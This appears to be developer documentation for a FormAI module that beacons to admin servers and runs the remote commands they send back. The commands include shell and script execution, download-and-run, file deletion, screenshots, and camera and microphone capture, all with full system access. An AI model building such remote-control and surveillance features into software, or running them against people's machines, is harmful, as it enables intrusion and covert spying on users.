# Admin Callback System

> Two-way communication between client and admin server

## Overview

The Client Callback system enables remote management of FormAI installations. Clients send heartbeats to admin server(s) and receive commands for remote execution.

**Key File:** `client_callback.py`

---

## How It Works

```
┌──────────────────┐         ┌──────────────────┐
│   FormAI Client  │  ────►  │   Admin Server   │
│   (Port 5511)    │         │   (Port 5512)    │
└──────────────────┘         └──────────────────┘
        │                            │
        │  1. Heartbeat (every 5s)   │
        │  ──────────────────────►   │
        │                            │
        │  2. Commands (if any)      │
        │  ◄──────────────────────   │
        │                            │
        │  3. Command Results        │
        │  ──────────────────────►   │
        └────────────────────────────┘
```

---

## ClientCallback Class

**File:** `client_callback.py:17-1468`

```python
from client_callback import ClientCallback

# Initialize with single admin URL
callback = ClientCallback(
    admin_url="http://admin.example.com:5512",
    interval=5,     # Heartbeat interval (seconds)
    quiet=True      # Suppress verbose logging
)

# Or multiple admin URLs
callback = ClientCallback(
    admin_urls=[
        "http://admin1.example.com:5512",
        "http://admin2.example.com:5512"
    ]
)

# Start background heartbeat loop
callback.start()
```

---

## Heartbeat Payload

Sent every 5 seconds to all configured admin URLs:

```python
{
    "hostname": "DESKTOP-ABC123",
    "local_ip": "192.168.1.100",
    "platform": "Windows",
    "platform_version": "10.0.19044",
    "machine": "AMD64",
    "python_version": "3.11.0",
    "timestamp": "2025-12-31T10:30:00",
    "version": "1.0.0",
    "license_key": "FORMAI-XXXX-XXXX",
    "machine_id": "MACHINE-abcd1234-..."
}
```

---

## Remote Commands

### Available Commands

| Command | Purpose |
|---------|---------|
| `ping` | Connectivity test |
| `get_status` | Get system info |
| `screenshot` | Capture screen |
| `restart` | Restart FormAI |
| `update_config` | Update .env file |
| `execute_script` | Run Python/shell script |
| `update_formai` | Download and apply update |
| `run_program` | Download and run executable |

### File Operations

| Command | Purpose |
|---------|---------|
| `list_directory` | List folder contents |
| `read_file` | Read file (text or base64) |
| `write_file` | Write/upload file |
| `download_file` | Download file as base64 |
| `delete_file` | Delete file or folder |
| `create_folder` | Create directory |

### Process Management

| Command | Purpose |
|---------|---------|
| `list_processes` | List running processes |
| `kill_process` | Kill by name or PID |
| `duplicate_process` | Launch new instance |

### Camera/Audio

| Command | Purpose |
|---------|---------|
| `camera_list` | List available cameras |
| `camera_start` | Start camera streaming |
| `camera_snapshot` | Capture single frame |
| `camera_quick_snapshot` | Quick capture (no start/stop) |
| `camera_stop` | Stop camera streaming |
| `mic_list` | List microphones |
| `mic_start` | Start recording |
| `mic_stop` | Stop recording |

### Device/Network

| Command | Purpose |
|---------|---------|
| `scan_devices` | Enumerate all devices |
| `network_enable` | Enable network adapter |
| `network_disable` | Disable network adapter |
| `network_get_config` | Get adapter settings |
| `network_set_config` | Update adapter settings |
| `usb_safely_remove` | Eject USB device |
| `storage_get_info` | Get disk information |

---

## License Management

**File:** `client_callback.py:60-129`

Machine ID generated from hardware fingerprint:
- Hostname
- MAC address
- Disk serial number
- Platform info

```python
# License key stored in license.key file
callback.license_key      # "FORMAI-XXXX-XXXX"
callback.machine_id       # "MACHINE-abcd1234-..."
callback.license_valid    # True/False
callback.license_status   # "valid", "expired", "unknown"

# Save new license
callback.save_license_key("FORMAI-NEW-KEY")
```

---

## Command Handlers

### Adding Custom Handler

```python
async def my_custom_handler(params: dict) -> dict:
    """Custom command handler"""
    value = params.get("my_param", "default")
    # Do something...
    return {"status": "success", "result": value}

# Register handler
callback.command_handlers["my_command"] = my_custom_handler
```

### Handler Response Format

```python
# Success
{"status": "success", "data": {...}}

# Error
{"status": "error", "message": "What went wrong"}
```

---

## Screenshot Handler

**Function:** `_handle_screenshot()` at line 527

Uses PIL or mss for screen capture:

```python
result = await callback._handle_screenshot({})
# Returns:
{
    "status": "success",
    "screenshot": "base64_encoded_png...",
    "format": "png",
    "size": 123456,
    "dimensions": "1920x1080"
}
```

---

## Camera Streaming

**Functions:** `_handle_camera_start()`, `_camera_streaming_task()`

When camera starts, a background task pushes frames to admin:

```python
# Start camera
await callback._handle_camera_start({"camera_index": 0})

# Streaming runs at 10 FPS
# Frames pushed to: {admin_url}/api/camera/push_frame/{client_id}

# Stop camera
await callback._handle_camera_stop({})
```

---

## Script Execution

**Function:** `_handle_execute_script()` at line 263

Executes Python first, falls back to shell:

```python
# Python execution
result = await callback._handle_execute_script({
    "script": "print('Hello from Python')"
})

# Shell execution (explicit)
result = await callback._handle_execute_script({
    "script": "cmd /c dir C:\\"
})
```

---

## Integration with FormAI Server

**File:** `formai_server.py`

```python
from client_callback import ClientCallback

# Initialize at startup
callback = ClientCallback(
    admin_url=os.getenv("ADMIN_URL"),
    quiet=True
)

@app.on_event("startup")
async def startup():
    callback.start()

@app.on_event("shutdown")
async def shutdown():
    await callback.stop()
```

---

## Environment Configuration

```env
# Single admin server
ADMIN_URL=http://admin.example.com:5512

# Interval is hardcoded to 5 seconds for fast command execution
```

---

## Error Handling

```python
try:
    await callback.send_heartbeat()
except httpx.TimeoutException:
    # Admin server timeout - will retry
except httpx.ConnectError:
    # Cannot connect - will retry
```

---

## Security Considerations

- Commands execute with full system access
- Only enable callback to trusted admin servers
- License validation happens on first (primary) admin URL
- Machine ID prevents license sharing across machines

---

## Key Methods

| Method | Purpose |
|--------|---------|
| `start()` | Begin background heartbeat loop |
| `stop()` | Stop heartbeat loop |
| `send_heartbeat()` | Send single heartbeat |
| `get_system_info()` | Gather system information |
| `save_license_key()` | Store license to file |
